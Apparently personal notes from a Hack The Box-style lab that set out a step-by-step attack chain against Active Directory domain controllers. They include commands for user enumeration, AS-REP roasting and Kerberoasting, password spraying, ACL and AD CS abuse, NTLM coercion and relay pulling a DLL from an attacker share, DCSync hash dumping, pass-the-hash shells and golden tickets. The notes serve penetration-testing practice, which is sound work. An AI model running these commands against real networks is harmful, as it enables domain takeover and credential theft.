---
tags: [pentest, htb, windows, active-directory, walkthrough-pattern, both]
type: workflow
---
# Windows Active Directory Box - Walkthrough Pattern

[[00 - README|Folder index]]

AD boxes are their own beast. Some are 1-host "mini-AD," others are full multi-host networks. Common to medium/hard rated.

## Hallmarks

- 88 (Kerberos) + 389 (LDAP) + 445 (SMB) + 53 (DNS) on the same host = Domain Controller
- The path is almost always: **unauthenticated info → user cred → BloodHound → privesc path → DA → DCSync**

## The standard AD chain

```text
1. Identify DC, domain name, subdomain on /etc/hosts
2. Anonymous SMB / null session / RPC for user list
3. Username list → kerbrute userenum  → confirmed users
4. AS-REP roast confirmed users → crack
5. With ANY cred → bloodhound-python -c All
6. BloodHound:
     - Find Shortest Paths to Domain Admins
     - Find AS-REP / Kerberoastable users
     - Find users with DCSync rights
     - Find machines you can RDP / WinRM to
7. Walk one of those paths:
     a. Kerberoast → crack TGS → use as cred → repeat from step 5
     b. ACL abuse (WriteDACL / GenericAll / GenericWrite) → reset password or add to group
     c. AD CS ESC1-ESC11 → cert for admin → authenticate
     d. Coercion + relay (PetitPotam → ntlmrelayx --escalate-user)
     e. NoPac / ZeroLogon / PrintNightmare if patch level allows
8. Once you have admin cred:
     - DCSync via secretsdump
     - Crack krbtgt → Golden Ticket for persistence demo
     - Loot user.txt and root.txt
```

## Step-by-step commands

### Phase 1: Domain info without creds

```bash
# What's the domain name?
nmap -p389 --script ldap-rootdse 10.10.10.x
# or: ldapsearch -x -h 10.10.10.x -s base namingcontexts

# Add to /etc/hosts (typical: corp.local + DC.corp.local)
echo "10.10.10.x  dc.corp.local corp.local" | sudo tee -a /etc/hosts

# Kerberos in clock-sync sensitive - sync time
sudo ntpdate -u 10.10.10.x
# or: sudo rdate -n 10.10.10.x
# (or for impacket-only: pass -k flag and ensure clock skew < 5 min)
```

### Phase 2: User enumeration without creds

```bash
# Null SMB session - users by SID
nxc smb 10.10.10.x -u '' -p '' --rid-brute
impacket-lookupsid corp.local/anonymous@10.10.10.x

# rpcclient null
rpcclient -U "" -N 10.10.10.x
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> queryuser 0x3e8

# LDAP anonymous
ldapsearch -x -h 10.10.10.x -b "DC=corp,DC=local" '(objectClass=user)' sAMAccountName | grep sAMAccountName

# kerbrute (works without creds, only needs DC reachable)
kerbrute userenum -d corp.local --dc 10.10.10.x /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o users.txt
```

### Phase 3: Pre-auth attacks

```bash
# AS-REP roast (no password needed for users with DONT_REQ_PREAUTH)
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.x -outputfile asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# Password spray (BE CAREFUL - lockout policy unknown)
nxc smb 10.10.10.x -u users.txt -p 'Welcome1' --continue-on-success
nxc smb 10.10.10.x -u users.txt -p 'Spring2026!' --continue-on-success
# Check policy first:
nxc smb 10.10.10.x -u user -p '' --pass-pol
```

### Phase 4: First credential acquired

```bash
# Sanity check
nxc smb 10.10.10.x -u found_user -p found_pass

# Kerberoast (authenticated)
impacket-GetUserSPNs corp.local/found_user:found_pass -dc-ip 10.10.10.x -request -outputfile tgs.hash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt

# Pull BloodHound data
bloodhound-python -d corp.local -u found_user -p found_pass -ns 10.10.10.x -c All

# Try every service
nxc winrm   10.10.10.x -u found_user -p found_pass
nxc rdp     10.10.10.x -u found_user -p found_pass
nxc mssql   10.10.10.x -u found_user -p found_pass
nxc ldap    10.10.10.x -u found_user -p found_pass --users
```

### Phase 5: BloodHound

Open BloodHound CE, drag the `.zip` from bloodhound-python output.

Run these prebuilt queries:

1. **"Find Shortest Paths to Domain Admins"** - mark `found_user` as Owned first
2. **"Find AS-REP Roastable Users"** - if not yet attempted
3. **"Find Kerberoastable Users"** - if not yet attempted
4. **"Find Computers with Unconstrained Delegation"** - relay/coerce path
5. **"Shortest Paths from Owned Principals"**
6. **Cypher** custom: `MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p`

Common edges and how to abuse:

| Edge in BloodHound | Abuse |
| --- | --- |
| `ForceChangePassword` | `net rpc password ...` or `bloodyAD set password` |
| `GenericAll` / `GenericWrite` on user | Reset password, or set SPN → Kerberoast |
| `GenericAll` on group | Add yourself to the group |
| `WriteDACL` | Grant yourself DCSync / GenericAll |
| `AddSelf` | Add yourself to group |
| `WriteOwner` | Take ownership → modify ACL → win |
| `AllowedToDelegate` | RBCD attack |
| `AddKeyCredentialLink` | Shadow Credentials (Whisker / pyWhisker / Certipy shadow) |
| `MemberOf` Domain Admins | You're done |

### Phase 6: AD CS check (ALWAYS run on AD boxes)

```bash
certipy find -u found_user@corp.local -p found_pass -dc-ip 10.10.10.x -vulnerable -stdout
```

Common ESC abuses:

| ESC | Trigger | Exploit |
| --- | --- | --- |
| ESC1 | Template lets enrollee supply subject + Client Auth | `certipy req` with `-upn administrator@corp.local` |
| ESC2 | Template allows Any Purpose | Same as ESC1 |
| ESC3 | Enrollment Agent template | Request agent cert, then on-behalf-of |
| ESC4 | Vulnerable template ACL | Modify template (write attribute) → ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | Specify any UPN in CSR |
| ESC7 | Vulnerable CA ACL | Grant yourself ManageCA → enable ESC6 |
| ESC8 | HTTP enrollment endpoint (web enrollment) | NTLM relay → cert for victim |
| ESC11 | RPC enrollment without sign | Relay via PetitPotam |

### Phase 7: Coercion + relay (when ESC8 / ESC11 / RBCD)

```bash
# Disable SMB signing requirement first - relay to LDAPS/HTTP/etc.
impacket-ntlmrelayx -t http://ca/certsrv/certfnsh.asp --adcs --template "DomainController" -smb2support

# Coerce DC to auth back
impacket-PrintNightmare.py corp.local/found_user:'pass'@dc01.corp.local '\\10.10.14.5\share\evil.dll'
python3 PetitPotam.py 10.10.14.5 10.10.10.x
python3 Coercer.py coerce -u found_user -p pass -d corp.local -l 10.10.14.5 -t 10.10.10.x
```

### Phase 8: DA / DCSync

```bash
# As DA (or with DCSync rights):
impacket-secretsdump -just-dc corp.local/Administrator:'pass'@10.10.10.x
# Pulls all NTDS hashes incl. krbtgt

# Pass-the-hash to admin shell
impacket-psexec -hashes :<NTLM> Administrator@10.10.10.x
# or
evil-winrm -i 10.10.10.x -u Administrator -H <NTLM>
```

### Phase 9: Golden ticket (persistence demo, not always required)

```text
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<NTLM> /ptt
mimikatz # misc::cmd
```

## AD-specific gotchas

- **Clock skew** - if Kerberos commands return KRB_AP_ERR_SKEW, sync time.
- **DNS** - Kerberos uses *names*, not IPs. Use the DC's name; add to /etc/hosts.
- **Case sensitivity** - usernames are case-insensitive, but Kerberos realm strings must be UPPERCASE in some tools.
- **NTLM vs. Kerberos** - some impacket tools want `-k` (Kerberos), others NTLM by default.
- **Service tickets vs. TGTs** - distinguish them when running into "this account is not authorized" errors.

> [!tip] AD boxes reward patience and BloodHound
> Don't try to "guess" the path. Get any cred, dump BloodHound, follow the edges. The graph IS the walkthrough.
